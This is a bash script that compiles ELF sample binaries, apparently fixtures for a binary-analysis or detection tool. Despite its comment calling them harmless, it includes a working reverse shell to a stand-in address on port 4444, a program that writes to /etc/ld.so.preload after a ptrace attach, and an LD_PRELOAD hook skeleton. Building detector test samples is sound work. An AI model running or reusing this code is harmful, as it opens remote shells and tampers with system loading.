#!/bin/bash
# ELF ornekleri (zararsiz; yalnizca import/ihracat kalibi). Kullanim: build_elf.sh <cikti>
set -e; OUT=${1:?}; mkdir -p "$OUT"; W=$(mktemp -d); cd "$W"
cat > rev.c <<'C'
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
int main(void){ int s=socket(2,1,0); struct sockaddr_in a={0}; a.sin_family=2; a.sin_port=htons(4444); inet_pton(2,"203.0.113.9",&a.sin_addr); if(connect(s,(struct sockaddr*)&a,sizeof a)==0){ dup2(s,0); dup2(s,1); dup2(s,2); char *av[]={"/bin/sh",0}; execve("/bin/sh",av,0);} return 0; }
C
gcc -O1 -o "$OUT/elf_revshell" rev.c
cat > hook.c <<'C'
#define _GNU_SOURCE
#include <dlfcn.h>
#include <dirent.h>
#include <stdio.h>
struct dirent *readdir(DIR *d){ struct dirent *(*o)(DIR*)=dlsym(RTLD_NEXT,"readdir"); return o(d); }
struct dirent64 *readdir64(DIR *d){ struct dirent64 *(*o)(DIR*)=dlsym(RTLD_NEXT,"readdir64"); return o(d); }
FILE *fopen(const char*p,const char*m){ FILE*(*o)(const char*,const char*)=dlsym(RTLD_NEXT,"fopen"); return o(p,m); }
C
gcc -shared -fPIC -O1 -o "$OUT/elf_hooklib.so" hook.c -ldl
cat > pt.c <<'C'
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <stdio.h>
int main(int c,char**v){ ptrace(PTRACE_ATTACH, 1234, 0, 0); int st; waitpid(1234,&st,0); const char*p="/etc/ld.so.preload"; FILE*f=fopen(p,"w"); if(f) fputs("/tmp/x.so\n",f); return 0; }
C
gcc -O1 -o "$OUT/elf_ptrace" pt.c
cat > hello.c <<'C'
#include <stdio.h>
int main(){ puts("hello"); return 0; }
C
gcc -O2 -o "$OUT/elf_hello" hello.c && strip "$OUT/elf_hello"
gcc -static -O2 -o "$OUT/elf_static" hello.c
ls -la "$OUT"
